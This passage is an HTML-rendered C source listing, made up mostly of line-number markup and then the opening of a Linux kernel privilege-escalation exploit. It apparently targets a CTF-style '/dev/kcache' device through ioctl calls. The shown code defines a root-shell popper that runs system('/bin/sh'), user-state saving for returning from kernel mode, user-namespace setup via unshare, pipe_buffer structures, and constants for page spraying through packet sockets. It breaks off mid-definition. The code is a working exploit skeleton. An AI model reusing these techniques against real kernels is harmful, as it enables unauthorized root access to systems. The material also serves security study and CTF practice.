class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief create an isolate namespace</span><br><span class="hljs-comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span><br><span class="hljs-comment"> * to perform basic exploiting operations in it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_NUM 0x10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_ALLOC 0x114</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_APPEND 0x514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_READ 0x1919</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_FREE 0x810</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_append</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_read</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_free</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * III -  pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 